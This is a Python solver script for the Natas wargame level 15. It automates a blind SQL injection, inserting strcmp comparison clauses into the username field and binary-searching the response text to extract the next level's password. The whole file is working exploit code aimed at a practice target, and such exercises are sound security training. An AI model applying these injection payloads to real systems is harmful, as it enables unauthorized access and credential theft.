"""
natas15: "blind" SQL injection
"""

import asyncio
import aiohttp
import string
from time import sleep
from typing import NewType, Optional, Union

from natas_utils import *

LEVEL = 15

QUERY_SUCCESS_INDICATOR = "This user exists."

Less = NewType("LessThan", int)
Equal = NewType("EqualTo", int)
Greater = NewType("GreaterThan", int)

LT = Less(-1)
EQ = Equal(0)
GT = Greater(1)

CHARS = string.digits + string.ascii_uppercase + string.ascii_lowercase

def solve(url: str, login: LevelLogin) -> Optional[str]:
    candidate = asyncio.run(solve_async(url, login))
    return try_level_login(LEVEL + 1, [candidate])

async def solve_async(url: str, login: LevelLogin) -> str:
    # need to extract user natas16's password
    username = "natas16"

    async with aiohttp.ClientSession(auth=aiohttp.BasicAuth(*login)) as session:
        response = await session.post(url, data={"username": "natas16"})

        flag = await binary_search_password(session, url, username)

    return flag

async def binary_search_password(session: aiohttp.ClientSession, url: str, username: str):
    match_found = False
    password = ""
    for _ in range(64):
        # search bounds
        low = 0
        high = len(CHARS) - 1

        while low < high - 1:
            # midpoint to check
            mid = low + (high - low) // 2

            res = await query_comparison(session, url, username, password + CHARS[mid])

            if res is LT:
                low = mid
            elif res is GT:
                high = mid
            elif res is EQ:
                return password + CHARS[mid]

        password += CHARS[low]
        # print(len(password), password)

    return password

async def query_comparison(session: aiohttp.ClientSession, url: str, username: str, password: str) -> Union[Less, Equal, Greater]:
    """
    Query with a username and password, checking whether the given password is less than,
    equal to, or greater than the actual password.
    """
    # relevant source line:
    # `$query = "SELECT * from users where username=\"".$_REQUEST["username"]."\"";`
    greater = {
        "username": f'{username}" and strcmp(binary "{password}", binary password)=1 #'
    }
    equal = {
        "username": f'{username}" and strcmp(binary "{password}", binary password)=0 #'
    }

    response_greater = query(session, url, greater)
    response_equal = query(session, url, equal)

    gt, eq = await asyncio.gather(response_greater, response_equal)
    # print(f"{gt} {eq} {password[-1]}")

    if gt:
        return GT
    elif eq:
        return EQ
    else:
        return LT

async def query(session: aiohttp.ClientSession, url: str, data: dict) -> bool:
    response = await session.post(url, data=data)
    text = await response.text()
    # print(text)
    return QUERY_SUCCESS_INDICATOR in text

if __name__ == "__main__":
    url, login = load_level(LEVEL)
    flag = solve(url, login)

    if flag:
        print("natas{:02}:".format(LEVEL + 1), flag)
        store_level_password(LEVEL + 1, flag)
    else:
        exit("Failed to get password for natas{:02}.".format(LEVEL + 1))